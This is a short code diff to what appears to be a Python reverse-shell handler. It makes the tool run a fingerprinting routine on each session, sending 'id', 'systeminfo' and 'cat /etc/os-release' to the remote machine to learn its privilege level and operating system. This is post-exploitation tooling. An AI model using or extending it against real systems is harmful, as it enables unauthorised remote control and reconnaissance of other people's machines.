@@ -126,7 +126,7 @@ class Socket:
         except socket.error as err:
             err = err.args[0]
             if err == errno.EAGAIN or err == errno.EWOULDBLOCK:
-                return output
+                return output.lstrip("b").replace('"', '').replace("'", "").replace('\\n', '')
             else:
                 print("[!] Error: Connection lost")
                 self.close()
@@ -172,6 +172,7 @@ class Shell:
     def interact(self):
         time.sleep(0.1)
         RSH.help(self)
+        RSH.fingerprint(self)
         while True:
             self.output()
             self.input()
@@ -496,6 +497,8 @@ class RSH:
 
     def fingerprint(self):
         self.sock.send("id\n")
-        print("[+] ID level: %s" % self.sock.receive())
-        self.sock.send("which\n")
-        print("[+] Operating system: %s" % self.sock.receive())
+        print("[+] ID level : %s" % self.sock.receive())
+        self.sock.send("systeminfo | findstr /R '^OS.Name'\n")
+        if "not found" in self.sock.receive() :
+            self.sock.send("cat /etc/os-release | head -n 1 | cut -d '=' -f2\n")
+        print("[+] Operating system : %s" % self.sock.receive())
